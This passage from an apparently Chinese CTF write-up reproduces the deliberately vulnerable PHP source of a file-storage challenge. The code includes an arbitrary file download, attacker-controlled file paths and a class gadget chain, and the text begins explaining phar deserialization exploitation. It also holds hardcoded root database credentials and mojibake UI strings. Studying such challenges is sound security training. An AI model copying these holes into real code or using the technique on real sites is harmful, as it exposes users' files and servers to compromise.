class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span></span><br><span class="line"><span class="php">    header(<span class="string">"Location: login.php"</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>缃戠洏绠＄悊<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/css/panel.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/bootstrap.bundle.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/toast.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/panel.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">aria-label</span>=<span class="string">"breadcrumb"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span> <span class="attr">class</span>=<span class="string">"breadcrumb"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item active"</span>&gt;</span>绠＄悊闈㈡澘<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item active"</span>&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"fileInput"</span> <span class="attr">class</span>=<span class="string">"fileLabel"</span>&gt;</span>涓婁紶鏂囦欢<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active ml-auto"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>浣犲ソ <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_SESSION[<span class="string">'username'</span>]<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"fileInput"</span> <span class="attr">class</span>=<span class="string">"hidden"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"top"</span> <span class="attr">id</span>=<span class="string">"toast-container"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> FileList($_SESSION[<span class="string">'sandbox'</span>]);		<span class="comment">#new了一个FileList对象，事件里添加一个沙箱</span></span></span><br><span class="line"><span class="php">$a-&gt;Name();</span></span><br><span class="line"><span class="php">$a-&gt;Size();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>最重要的来了。</p>
+<h2 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$dbuser = <span class="string">"root"</span>;</span><br><span class="line">$dbpass = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"dropbox"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);			<span class="comment">#创建数据库</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;			<span class="comment">#用户类，有一个db属性</span></span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;		<span class="comment">#构造方法，为db赋全局变量db的值</span></span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;	</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;			<span class="comment">#验证用户是否存在</span></span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;		<span class="comment">#添加用户</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;		<span class="comment">#验证用户密码</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;			<span class="comment">#User的析构方法，启用db的close()方法</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;		</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);	<span class="comment">#列出 $path 目录中的文件和目录并赋值给filenames数组,</span></span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);		<span class="comment">#销毁带文件名带.or..的文件</span></span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;		</span><br><span class="line">            $file = <span class="keyword">new</span> File();	</span><br><span class="line">            $file-&gt;open($path . $filename);		<span class="comment">#给file赋值filename</span></span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);	<span class="comment">#为files数组添加filename</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();	<span class="comment">#result的键名为filename</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;	<span class="comment">#调用类中不存在的方法时触发__call,给每个对象添加这个方法</span></span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();	</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;		<span class="comment">#离怀秋师傅指出这是打印出方法的结果</span></span><br><span class="line">        $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;涓嬭浇&lt;/a&gt; / &lt;a href="#" class="delete"&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;	</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;		<span class="comment">#包含文件</span></span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="delete-php"><a href="#delete-php" class="headerlink" title="delete.php"></a>delete.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="upload-php"><a href="#upload-php" class="headerlink" title="upload.php"></a>upload.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"file"</span>])) &#123;</span><br><span class="line">    $filename = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $pos = strrpos($filename, <span class="string">"."</span>);</span><br><span class="line">    <span class="keyword">if</span> ($pos !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $filename = substr($filename, <span class="number">0</span>, $pos);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $fileext = <span class="string">".gif"</span>;</span><br><span class="line">    <span class="keyword">switch</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/gif'</span>:</span><br><span class="line">            $fileext = <span class="string">".gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/jpeg'</span>:</span><br><span class="line">            $fileext = <span class="string">".jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/png'</span>:</span><br><span class="line">            $fileext = <span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"Only gif/jpg/png allowed"</span>);</span><br><span class="line">            Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">            <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; strlen($filename) !== <span class="number">0</span>) &#123;</span><br><span class="line">        $dst = $_SESSION[<span class="string">'sandbox'</span>] . $filename . $fileext;</span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $dst);</span><br><span class="line">        $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">        Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">        <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"Invaild filename"</span>);</span><br><span class="line">        Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">        <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="download-php"><a href="#download-php" class="headerlink" title="download.php"></a>download.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, <span class="string">"flag"</span>) === <span class="keyword">false</span>) &#123;			</span><br><span class="line">    Header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">    Header(<span class="string">"Content-Disposition: attachment; filename="</span> . basename($filename));</span><br><span class="line">    <span class="keyword">echo</span> $file-&gt;close();	<span class="comment">#除了flag文件不让读以外，任意文件读取并显示</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File not exist"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这道题没有unserialize()函数，所以用的是phar反序列化漏洞，</p>
+<p>利用条件：</p>
+<p>存在：<br>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数</p>
+<p>要有可用的魔术方法作为“跳板”。<br>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</p>
